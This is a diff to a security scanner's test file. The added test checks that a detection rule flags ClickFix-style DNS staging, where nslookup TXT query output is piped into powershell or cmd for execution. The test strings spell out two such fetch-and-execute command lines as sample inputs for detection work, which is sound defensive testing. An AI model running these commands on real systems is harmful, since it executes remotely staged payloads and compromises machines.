@@ -246,3 +246,26 @@ def test_new_patterns_2026_02_19_patch2() -> None:
     assert chn006 is not None
     assert "gh_pr_target" in chn006.all_of
     assert "gh_pr_untrusted_meta" in chn006.all_of
+
+
+def test_new_patterns_2026_02_20() -> None:
+    """Test ClickFix DNS nslookup staged execution markers."""
+    compiled = load_compiled_builtin_rulepack()
+
+    mal009 = next((r for r in compiled.static_rules if r.id == "MAL-009"), None)
+    assert mal009 is not None
+    assert (
+        mal009.pattern.search(
+            "nslookup -q=txt example.com 84.21.189.20 | "
+            "findstr /R \"^Name:\" | powershell -NoProfile -Command -"
+        )
+        is not None
+    )
+    assert (
+        mal009.pattern.search(
+            "for /f \"tokens=*\" %i in ('nslookup -querytype=txt "
+            "stage.example 8.8.8.8 ^| findstr Name') do cmd /c %i"
+        )
+        is not None
+    )
+    assert mal009.pattern.search('nslookup example.com 8.8.8.8') is None
